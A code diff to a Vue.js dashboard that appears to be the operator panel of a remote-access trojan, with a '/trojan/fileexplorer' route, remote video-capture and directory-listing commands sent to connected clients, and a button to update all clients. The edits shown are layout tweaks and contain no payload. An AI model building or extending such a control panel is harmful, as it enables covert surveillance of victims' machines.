@@ -16,11 +16,24 @@
       </v-container>
     </v-container>
     <v-container v-if="$store.state.clients.verify.show" class="ma-0 pa-0">
-      <p :style="status_style" class="ml-3">{{ server_status }}</p>
+      <v-container class="d-flex">
+        <p :style="status_style" class="ml-3">{{ server_status }}</p>
+        <p v-if="clientArr.length && server_status == '已连接'" class="ml-3">
+          连接数:{{ clientArr && clientArr.length ? clientArr.length : 0 }}
+        </p>
+        <v-spacer></v-spacer>
+        <v-menu offset-y>
+          <template v-slot:activator="{ on }">
+            <v-btn v-on="on"
+              >更多<v-icon class="ml-1" small>fa-angle-down</v-icon></v-btn
+            >
+          </template>
+          <v-btn-toggle multiple max="0">
+            <v-btn @click="updateAllClients" outlined> 更新所有客户端 </v-btn>
+          </v-btn-toggle>
+        </v-menu>
+      </v-container>
       <v-container>
-        <v-btn-toggle multiple max="0">
-          <v-btn @click="updateAllClients" outlined> 更新所有客户端 </v-btn>
-        </v-btn-toggle>
         <v-alert
           transition="slide-x-transition"
           style="
@@ -51,7 +64,7 @@
               </v-row> </template></v-img
         ></v-alert>
       </v-container>
-      <v-container style="overflow: auto; height: 65vh">
+      <v-container style="overflow: auto; height: 70vh">
         <v-item-group v-model="selectedIndex">
           <template v-for="i in clientArr">
             <v-item :key="i.id" v-slot="{ toggle }" class="mb-4">
@@ -269,6 +282,7 @@ export default {
 
       this.$store.state.io.on("disconnect", () => {
         this.server_status = "已断开";
+        this.clientArr = [];
       });
 
       this.$store.state.io.on("apigetallclients", (carr) => {
@@ -416,7 +430,7 @@ export default {
       this.$store.state.io.emit("apistartvideocapture", id);
     },
     showFileExplorer(id) {
-      this.$store.state.io.emit("apilistdir", id, ".");
+      // this.$store.state.io.emit("apilistdir", id, ".");
       this.$router.push({
         path: `/trojan/fileexplorer`,
         query: {
